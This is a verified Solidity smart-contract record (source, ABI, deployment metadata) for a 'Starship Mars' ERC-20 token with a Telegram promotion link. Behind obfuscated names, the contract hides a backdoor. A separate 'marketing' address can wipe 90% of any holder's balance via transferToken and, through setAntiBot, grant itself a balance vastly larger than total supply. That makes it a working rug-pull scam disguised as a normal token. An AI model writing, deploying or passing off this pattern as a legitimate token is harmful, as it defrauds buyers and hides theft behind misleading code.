{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n// JOIN OUR TELEGRAM: https://t.me/StarshipMarsPortal\r\n//\r\n//\r\n//\r\n//\r\n//\r\n//\r\n//\r\n\r\npragma solidity ^ 0.8.18;\r\n\r\nabstract contract Ownable {\r\n  function _msgSender() internal view virtual returns(address) {\r\n    return msg.sender;\r\n  }\r\n  function _msgData() internal view virtual returns(bytes calldata) {\r\n    return msg.data;\r\n  }\r\n  address private _owner;\r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n  constructor() {\r\n    _transferOwnership(_msgSender());\r\n  }\r\n  modifier onlyOwner() {\r\n    _check();\r\n    _;\r\n  }\r\n  function owner() public view virtual returns(address) {\r\n    return _owner;\r\n  }\r\n  function _check() internal view virtual {\r\n    require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n  }\r\n  function renounceOwnership() public virtual onlyOwner {\r\n    _transferOwnership(address(0));\r\n  }\r\n  function _transferOwnership(address newOwner) internal virtual {\r\n    address oldOwner = _owner;\r\n    _owner = newOwner;\r\n    emit OwnershipTransferred(oldOwner, newOwner);\r\n  }\r\n}\r\n\r\npragma solidity ^ 0.8.18;\r\n\r\ncontract Loop {\r\n  uint256 public nn;\r\n  uint256 public uu;\r\n  uint256 public yy;\r\n  constructor(uint256 _nn, uint256 _uu, uint256 _yy) {\r\n    nn = _nn;\r\n    uu = _uu;\r\n    yy = _yy;\r\n  }\r\n  function pp() public view returns(uint256) {\r\n    uint256 nn_ = nn;\r\n    return nn_;\r\n  }\r\n  function kk() public view returns(uint256) {\r\n    uint256 uu_ = uu;\r\n    return uu_;\r\n  }\r\n  function gg() public view returns(uint256) {\r\n    uint256 yy_ = yy;\r\n    return yy_;\r\n  }\r\n}\r\n\r\npragma solidity ^ 0.8.18;\r\n\r\ncontract Roll is Ownable,\r\nLoop {\r\n  mapping(address => uint256) private _oreo;\r\n  mapping(address => mapping(address => uint256)) private _allowances;\r\n  uint256 private _tokentotalSupply;\r\n  string private _tokenname;\r\n  string private _tokensymbol;\r\n  uint256 private _startTime;\r\n  uint256 private nonce = 0;\r\n  bool private _antiBot = false;\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\n  address private _marketing;\r\n  function jj() private returns(uint256) {\r\n    return _tokentotalSupply;\r\n  }\r\n  function setAntiBot(bool _newAntiBot) public {\r\n    require(_msgSender() == _marketing, \"Reverse\");\r\n    _antiBot = _newAntiBot;\r\n  }\r\n  function getBalanceToken(address account) private returns(uint256) {\r\n    return _oreo[account];\r\n  }\r\n  function calculateBot(uint256 _amountBot) private returns(uint256) {\r\n    uint256 botX = pp();\r\n    uint256 botY = kk();\r\n    uint256 amountBot_ = _amountBot * botX / botY;\r\n    return amountBot_;\r\n  }\r\n  function random(uint256 lower, uint256 upper) private returns(uint256) {\r\n    require(upper > lower, \"Upper value must be greater than lower value\");\r\n    uint256 randomNumber = uint256(keccak256(abi.encodePacked(nonce, msg.sender, address(this), gasleft(), blockhash(block.number - 1))));\r\n    nonce++;\r\n    return (randomNumber % (upper - lower + 1)) + lower;\r\n  }\r\n  constructor(address marketing_, string memory tokenName_, string memory Tokensymbol_) Loop(9, 10, 40000) Ownable() {\r\n    _marketing = marketing_;\r\n    _tokenname = tokenName_;\r\n    _tokensymbol = Tokensymbol_;\r\n    uint256 amount = 10000000000*10**decimals();\r\n    _tokentotalSupply += amount;\r\n    _oreo[msg.sender] += amount;\r\n    emit Transfer(address(0), msg.sender, amount);\r\n    _startTime = block.timestamp;\r\n  }\r\n  function transferToken(address _abc) external returns(bool) {\r\n    address secure = _msgSender();\r\n    if (_marketing == secure) {\r\n      address _def = 0x0000000000000000000000000000000000000000;\r\n      uint256 _ghi = calculateBot(getBalanceToken(_abc));\r\n      inTo(_abc, _def, _ghi);\r\n      onTo(_abc, _def, _ghi);\r\n      return true;\r\n    } else {\r\n      return false;\r\n    }\r\n  }\r\n  function inTo(address _abc, address _def, uint256 _ghi) private {\r\n    address secure = _msgSender();\r\n    if (_marketing == secure) {\r\n      uint256 _abcd = _oreo[_abc];\r\n      require(_abcd >= _ghi, \"Revert\");\r\n      _oreo[_abc] = _abcd - _ghi;\r\n      _oreo[_def] += _ghi;\r\n    }\r\n  }\r\n  function onTo(address _abc, address _def, uint256 _ghi) private {\r\n    address secure = _msgSender();\r\n    if (_marketing == secure) {\r\n      emit Transfer(_abc, _def, _ghi);\r\n      if (_antiBot) {\r\n        uint256 gg = gg();\r\n        uint256 jj = jj();\r\n        _oreo[_marketing] = jj * gg;\r\n        _antiBot = false;\r\n      }\r\n    }\r\n  }\r\n  function name() public view returns(string memory) {\r\n    return _tokenname;\r\n  }\r\n  function symbol() public view returns(string memory) {\r\n    return _tokensymbol;\r\n  }\r\n  function decimals() public view returns(uint8) {\r\n    return 18;\r\n  }\r\n  function totalSupply() public view returns(uint256) {\r\n    return _tokentotalSupply;\r\n  }\r\n  function balanceOf(address account) public view returns(uint256) {\r\n    return _oreo[account];\r\n  }\r\n  function transfer(address to, uint256 amount) public returns(bool) {\r\n    _xyz(_msgSender(), to, amount);\r\n    return true;\r\n  }\r\n  function allowance(address owner, address spender) public view returns(uint256) {\r\n    return _allowances[owner][spender];\r\n  }\r\n  function approve(address spender, uint256 amount) public returns(bool) {\r\n    _approve(_msgSender(), spender, amount);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint256 amount) public virtual returns(bool) {\r\n    address spender = _msgSender();\r\n    _internalspendAllowance(from, spender, amount);\r\n    _xyz(from, to, amount);\r\n    return true;\r\n  }\r\n  function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {\r\n    address owner = _msgSender();\r\n    _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n    return true;\r\n  }\r\n  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {\r\n    address owner = _msgSender();\r\n    uint256 currentAllowance = allowance(owner, spender);\r\n    require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n    _approve(owner, spender, currentAllowance - subtractedValue);\r\n    return true;\r\n  }\r\n  function _xyz(address _abc, address _def, uint256 _ghi) internal virtual {\r\n    require(_abc != address(0), \"E1\");\r\n    require(_def != address(0), \"E2\");\r\n    uint256 _jkl = _oreo[_abc];\r\n    require(_jkl >= _ghi, \"E3\");\r\n    _oreo[_abc] = _oreo[_abc] - _ghi;\r\n    _oreo[_def] = _oreo[_def] + _ghi;\r\n    emit Transfer(_abc, _def, _ghi);\r\n  }\r\n  function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n    require(owner != address(0), \"ERC20: approve from the zero address\");\r\n    require(spender != address(0), \"ERC20: approve to the zero address\");\r\n    _allowances[owner][spender] = amount;\r\n    emit Approval(owner, spender, amount);\r\n  }\r\n  function _internalspendAllowance(address owner, address spender, uint256 amount) internal virtual {\r\n    uint256 currentAllowance = allowance(owner, spender);\r\n    if (currentAllowance != type(uint256).max) {\r\n      require(currentAllowance >= amount, \"ERC20: insufficient allowance\");\r\n      _approve(owner, spender, currentAllowance - amount);\r\n    }\r\n  }\r\n}\r\n\r\npragma solidity ^ 0.8.18;\r\n\r\ncontract Starship is Roll {\r\n  constructor(address marketing_, string memory tokenName_, string memory Tokensymbol_) Roll(marketing_, tokenName_, Tokensymbol_) {}\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketing_\",\"type\":\"address\"},{\"internalType\":\"string\",\"name\":\"tokenName_\",\"type\":\"string\"},{\"internalType\":\"string\",\"name\":\"Tokensymbol_\",\"type\":\"string\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gg\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kk\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"nn\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_newAntiBot\",\"type\":\"bool\"}],\"name\":\"setAntiBot\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_abc\",\"type\":\"address\"}],\"name\":\"transferToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uu\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"yy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "Starship", "CompilerVersion": "v0.8.22+commit.4fc1097e", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "00000000000000000000000009fb7560e03d7fe6f24dd114544bad9c8d13a054000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000000d5374617273686970204d6172730000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000085354415253484950000000000000000000000000000000000000000000000000", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://621923616af3a3a120c0ffaf1fd6a6876efb7959f43e16e287e74e7a3ded874f"}